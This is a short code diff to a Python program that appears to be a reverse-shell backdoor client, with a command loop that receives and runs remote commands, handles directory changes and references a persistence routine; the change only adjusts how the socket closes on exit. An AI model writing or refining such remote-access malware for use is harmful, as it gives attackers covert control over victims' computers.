@@ -27,7 +27,8 @@ def shell():
         cmd = reliable_recv()
         if cmd == "exit":
             reliable_send("exiting...")
-            break
+            s.close()
+            return
         elif cmd.startswith("cd") and len(cmd) > 1:
             try:
                 os.chdir(cmd[3:])
@@ -131,4 +132,3 @@ def persistence():
 if __name__ == '__main__':
     client()
     shell()
-    s.close()
